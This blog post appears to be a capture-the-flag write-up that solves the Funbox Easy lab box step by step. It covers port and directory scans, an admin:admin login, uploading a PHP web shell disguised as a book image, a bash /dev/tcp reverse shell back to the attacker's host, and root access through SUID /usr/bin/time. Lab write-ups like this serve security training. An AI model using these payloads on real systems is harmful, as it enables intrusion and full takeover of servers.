---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/funbox-easy,526/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

Starting with a simple `nmap` scan to identify the attack surface.

## port scan
```bash
$ nmap -Pn -p- 192.168.230.111
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-01 06:34 EST
Nmap scan report for 192.168.230.111
Host is up (0.032s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx

Nmap done: 1 IP address (1 host up) scanned in 20.64 seconds
```

## dir busting
```bash
$ gobuster dir -u http://192.168.230.111/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.230.111/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2023/01/01 06:35:13 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 318] [--> http://192.168.230.111/admin/]
/dashboard.php        (Status: 302) [Size: 10272] [--> http://192.168.230.111/index.php]
/forgot-password.php  (Status: 200) [Size: 2763]                                        
/header.php           (Status: 200) [Size: 1666]                                        
/index.php            (Status: 200) [Size: 3468]                                        
/index.php            (Status: 200) [Size: 3468]                                        
/index.html           (Status: 200) [Size: 10918]                                       
/index.html           (Status: 200) [Size: 10918]                                       
/logout.php           (Status: 200) [Size: 75]                                          
/profile.php          (Status: 302) [Size: 7247] [--> http://192.168.230.111/index.php] 
/registration.php     (Status: 200) [Size: 9409]                                        
/robots.txt           (Status: 200) [Size: 14]                                          
/robots.txt           (Status: 200) [Size: 14]                                          
/secret               (Status: 301) [Size: 319] [--> http://192.168.230.111/secret/]    
/store                (Status: 301) [Size: 318] [--> http://192.168.230.111/store/]     
                                                                                        
===============================================================
2023/01/01 06:36:56 Finished
===============================================================
```

---
# exploitation
## weak credentials

Going through the `gobuster` output shows a resource named `/store`
![bookstore](/images/funboxeasy_bookstore.png)  

Under `/store/admin.php` is a login.
![login](/images/funboxeasy_login.png)  

Checking for weak credentials.
### request
```http
POST /store/admin_verify.php HTTP/1.1
Host: 192.168.230.111
Content-Length: 35
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.230.111
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.230.111/store/admin.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=vkn7lqranr1540rug66ekg51at; sec_session_id=1cg0cuql7m1u0ai5hab8juf904
Connection: close

name=admin&pass=admin&submit=Submit
```

### response
```http
HTTP/1.1 302 Found
Date: Sun, 01 Jan 2023 12:21:34 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: admin_book.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

> A simple login check for `admin:admin` works.
{: .prompt-info }

## file upload and rce
Having a closer look at the admin panel reveals, that it is possibilty to edit books and upload an image for a book. 

![edit book](/images/funboxeasy_editbook.png)  

In the first step we create a simple `PHP` shell, we will try to upload to the server as a book image.

```php
<?php system($_REQUEST['cmd']); ?>
```

Now we try to upload it via the edit form.
### request
```http
POST /store/edit_book.php HTTP/1.1
Host: 192.168.230.111
Content-Length: 1536
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.230.111
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu10O2ndJrR7Bw8AK
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.230.111/store/admin_edit.php?bookisbn=978-1-49192-706-9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=vkn7lqranr1540rug66ekg51at; sec_session_id=1cg0cuql7m1u0ai5hab8juf904
Connection: close

------WebKitFormBoundaryu10O2ndJrR7Bw8AK
Content-Disposition: form-data; name="isbn"

978-1-49192-706-9
------WebKitFormBoundaryu10O2ndJrR7Bw8AK
Content-Disposition: form-data; name="title"

C# 6.0 in a Nutshell, 6th Edition
------WebKitFormBoundaryu10O2ndJrR7Bw8AK
Content-Disposition: form-data; name="author"

Joseph Albahari, Ben Albahari
------WebKitFormBoundaryu10O2ndJrR7Bw8AK
Content-Disposition: form-data; name="image"; filename="shell.php"
Content-Type: application/x-php

<?php system($_REQUEST['cmd']); ?>

------WebKitFormBoundaryu10O2ndJrR7Bw8AK
Content-Disposition: form-data; name="descr"

When you have questions about C# 6.0 or the .NET CLR and its core Framework assemblies, this bestselling guide has the answers you need. C# has become a language of unusual flexibility and breadth since its premiere in 2000, but this continual growth means there still much more to learn.

Organized around concepts and use cases, this thoroughly updated sixth edition provides intermediate and advanced programmers with a concise map of C# and .NET knowledge. Dive in and discover why this Nutshell guide is considered the definitive reference on C#.
------WebKitFormBoundaryu10O2ndJrR7Bw8AK
Content-Disposition: form-data; name="price"

20.00
------WebKitFormBoundaryu10O2ndJrR7Bw8AK
Content-Disposition: form-data; name="publisher"

OReilly Media
------WebKitFormBoundaryu10O2ndJrR7Bw8AK
Content-Disposition: form-data; name="save_change"

Change
------WebKitFormBoundaryu10O2ndJrR7Bw8AK--
```

### response
```http
HTTP/1.1 302 Found
Date: Sun, 01 Jan 2023 12:20:05 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: admin_edit.php?bookisbn=978-1-49192-706-9
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

No errors. Lets check if we changed the picture of the book.
![uploaded](/images/funboxeasy_uploaded.png)  

> When we check the resource behind the broken image icon, we see that our shell got uploaded.
{: .prompt-info }

![shell](/images/funboxeasy_shell.png)  

### request
```http
GET /store/bootstrap/img/shell.php?cmd=id HTTP/1.1
Host: 192.168.230.111
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=bu0q9rntu36tcho07li6erit21
Connection: close
```

### response
```http
HTTP/1.1 200 OK
Date: Sun, 01 Jan 2023 12:23:46 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 54
Connection: close
Content-Type: text/html; charset=UTF-8

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> And we got a shell!
{: .prompt-info }

---
# post exploitation
## reverse shell
### start listener on attacker machine
```bash
$ nc -lvp 80    
listening on [any] 80 ...
```

### trigger reverse shell
payload: `bash -c 'bash -i >& /dev/tcp/192.168.49.230/80 0>&1'`
```http
GET /store/bootstrap/img/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.230/80+0>%261' HTTP/1.1
Host: 192.168.230.111
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=bu0q9rntu36tcho07li6erit21
Connection: close
```

### catch connect from target
```bash
$ nc -lvp 80    
listening on [any] 80 ...
192.168.230.111: inverse host lookup failed: Unknown host
connect to [192.168.49.230] from (UNKNOWN) [192.168.230.111] 53368
bash: cannot set terminal process group (737): Inappropriate ioctl for device
bash: no job control in this shell
www-data@funbox3:/var/www/html/store/bootstrap/img$
```

## get first flag
```bash
www-data@funbox3:/var/www$ cd /var/www
cd /var/www
www-data@funbox3:/var/www$ ls
ls
html
local.txt
www-data@funbox3:/var/www$ cat local.txt
cat local.txt
8******************************c
```

## privilege escalation
### checking for `SUID` binaries
```bash
ww-data@funbox3:/var/www$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
<u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 473576 May 29  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 130152 Jul 10  2020 /usr/lib/snapd/snap-confine
...
-rwsr-xr-x 1 root root 14720 Apr 21  2017 /usr/bin/time
...
```

Checking all the binaries on [`gtfobins`](https://gtfobins.github.io/) reveals that the binary [`time`](https://gtfobins.github.io/gtfobins/time/#suid) can be used for privilege escalation.

```bash
www-data@funbox3:/var/www$ /usr/bin/time /bin/sh -p
/usr/bin/time /bin/sh -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

> Root!
{: .prompt-info }

#### hint
In this box there are a lot binaries with a `SUID` flag. Checking everyone of it on [`gtfobins`](https://gtfobins.github.io/) can take a long time and you might overlook something juicy. That is the reason I am using [suidPWN](https://github.com/Ha-L0/suidPWN) to check for vulnerable `SUID` binaries. It is a simple script I wrote for CTF purposes. You simply paste the `find` output into the tool and it tells you if a binary can be used for privilege escalation and how to exploit it.

## get second flag
```bash
cd /root
ls
proof.txt
root.flag
snap
cat proof.txt
3******************************e
```

Pwned! <@:-)

